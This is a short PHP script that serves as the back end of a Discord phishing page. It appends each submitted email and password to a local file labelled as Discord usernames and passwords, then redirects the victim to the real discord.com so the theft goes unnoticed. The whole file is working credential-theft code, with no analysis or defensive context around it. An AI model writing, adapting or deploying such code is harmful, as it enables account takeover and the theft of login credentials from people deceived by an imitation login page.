<?php
file_put_contents("usernames.txt", "Discord Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://www.discord.com');
exit();
?>